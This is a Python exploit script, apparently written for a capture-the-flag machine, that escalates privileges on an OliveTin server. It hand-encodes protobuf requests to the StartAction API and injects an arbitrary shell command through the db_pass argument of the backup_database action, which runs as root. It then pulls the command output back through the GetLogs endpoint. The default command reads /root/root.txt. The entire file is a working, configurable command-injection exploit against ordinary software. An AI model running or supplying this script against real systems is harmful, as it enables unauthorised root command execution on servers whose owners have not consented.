#!/usr/bin/env python3
"""
OliveTin privesc: backup_database argument injection (runs as root).
Requires SSH tunnel: -L 13337:127.0.0.1:1337 haris@<IP>
"""
import argparse
import json
import time
import urllib.request


def enc_varint(n: int) -> bytes:
    out = b""
    while n > 127:
        out += bytes([(n & 0x7F) | 0x80])
        n >>= 7
    out += bytes([n])
    return out


def enc_string(field_num: int, s: str) -> bytes:
    b = s.encode()
    tag = (field_num << 3) | 2
    return bytes([tag]) + enc_varint(len(b)) + b


def enc_msg(field_num: int, msg: bytes) -> bytes:
    tag = (field_num << 3) | 2
    return bytes([tag]) + enc_varint(len(msg)) + msg


def start_action(base: str, action_id: str, args: list[tuple[str, str]]) -> bytes:
    req = enc_string(1, action_id)
    for name, value in args:
        arg = enc_string(1, name) + enc_string(2, value)
        req += enc_msg(2, arg)
    url = f"{base.rstrip('/')}/api/StartAction"
    r = urllib.request.Request(
        url,
        data=req,
        method="POST",
        headers={"Content-Type": "application/proto"},
    )
    with urllib.request.urlopen(r, timeout=60) as resp:
        return resp.read()


def get_logs(base: str) -> dict:
    url = f"{base.rstrip('/')}/api/GetLogs"
    r = urllib.request.Request(
        url,
        data=b"{}",
        method="POST",
        headers={"Content-Type": "application/json"},
    )
    with urllib.request.urlopen(r, timeout=15) as resp:
        return json.loads(resp.read().decode())


def main():
    p = argparse.ArgumentParser()
    p.add_argument("--host", default="127.0.0.1")
    p.add_argument("--port", type=int, default=13337)
    p.add_argument("--cmd", default="cat /root/root.txt")
    args = p.parse_args()
    base = f"http://{args.host}:{args.port}"

    payload = f"x' ; {args.cmd} ; '"
    print(f"[*] StartAction backup_database @ {base}")
    start_action(
        base,
        "backup_database",
        [("db_user", "x"), ("db_pass", payload), ("db_name", "x")],
    )
    time.sleep(2)
    logs = get_logs(base)
    for entry in logs.get("logs", []):
        if entry.get("bindingId") == "backup_database":
            print(entry.get("output", ""))
            return
    print("[!] No backup_database log entry; dump last log:")
    if logs.get("logs"):
        print(logs["logs"][-1].get("output", ""))


if __name__ == "__main__":
    main()